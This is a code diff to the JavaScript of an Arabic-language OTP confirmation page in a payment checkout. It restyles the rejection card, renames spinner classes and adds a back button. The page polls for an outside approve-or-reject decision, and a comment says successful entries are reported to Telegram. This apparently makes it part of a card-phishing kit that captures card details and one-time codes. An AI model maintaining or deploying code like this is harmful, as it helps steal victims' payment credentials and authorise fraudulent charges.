@@ -166,16 +166,17 @@ function showRejection() {
   clearInterval(pollInt);
   const card = document.getElementById('otp-card');
   if (card) card.innerHTML = `
-    <div class="off-card-body" style="text-align:center;padding:2.5rem 1.5rem">
-      <div style="width:72px;height:72px;border-radius:50%;background:var(--red-bg);display:flex;align-items:center;justify-content:center;margin:0 auto 1.25rem">
-        <span class="material-icons" style="font-size:2.2rem;color:var(--red)">cancel</span>
+    <div class="otp-card-inner">
+      <div style="width:72px;height:72px;border-radius:50%;background:#fdecea;display:flex;align-items:center;justify-content:center;margin:0 auto">
+        <span class="material-icons" style="font-size:2.2rem;color:#e53935">cancel</span>
       </div>
-      <h2 style="font-size:1.2rem;font-weight:800;color:var(--red);margin-bottom:.5rem">تم رفض العملية</h2>
-      <p style="font-size:.88rem;color:var(--gray-500);line-height:1.65;margin-bottom:1.5rem">
+      <h2 style="font-size:1.2rem;font-weight:800;color:#e53935;margin-bottom:.25rem">تم رفض العملية</h2>
+      <p style="font-size:.88rem;color:#6b7c93;line-height:1.65;text-align:center">
         نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>
         يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
       </p>
-      <button type="button" class="off-btn-secondary" style="width:100%" onclick="window.location.href='secure-checkout.html'">
+      <button type="button" class="otp-back" onclick="window.location.href='secure-checkout.html'">
+        <span class="material-icons" style="font-size:.9rem">arrow_forward</span>
         العودة لصفحة الدفع
       </button>
     </div>`;
@@ -272,7 +273,7 @@ async function submitOTP() {
   const confirmBtn = document.getElementById('otp-confirm-btn');
   if (confirmBtn) {
     confirmBtn.disabled = true;
-    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> بانتظار التأكيد...';
+    confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> بانتظار التأكيد...';
   }
 
   /* تعطيل المربعات */
@@ -293,7 +294,7 @@ function showSuccess() {
   const confirmBtn = document.getElementById('otp-confirm-btn');
   if (confirmBtn) {
     confirmBtn.disabled = true;
-    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> جاري التأكيد...';
+    confirmBtn.innerHTML = '<span class="material-icons otp-spin">autorenew</span> جاري التأكيد...';
   }
 
   /* 📨 إشعار نجاح لـ Telegram */
